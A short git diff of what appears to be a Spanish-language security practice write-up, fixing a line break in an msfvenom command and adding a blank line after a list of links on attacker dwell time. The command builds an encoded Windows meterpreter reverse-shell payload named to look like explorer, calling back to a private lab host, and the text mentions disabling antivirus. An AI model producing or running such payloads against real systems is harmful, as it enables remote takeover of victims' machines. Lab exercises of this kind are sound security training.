@@ -5,7 +5,7 @@ Para esta practica se ha tenido que deshabilitar el antivirus de windows.
 # Crear payload
 
 ```bash
-> /usr/bin/msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp º
+> /usr/bin/msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp \
      -e x64/xor -b '\x00' -i 10  \
      LHOST=10.0.0.3 LPORT=4444 -f exe -o explorerp.exe
 ```
@@ -31,5 +31,6 @@ Para esta practica se ha tenido que deshabilitar el antivirus de windows.
   * https://www.startupdefense.io/es-us/blog/what-is-dwell-time-for-cybersecurity-e
   * https://www.zonamovilidad.es/las-empresas-tardan-13-horas-de-media-en-detectar-una-amenaza.html
   * https://www.itdigitalsecurity.es/endpoint/2021/09/hora-y-media-es-el-tiempo-que-tarda-un-ciberdelincuente-en-conseguir-su-objetivo
+
 
 
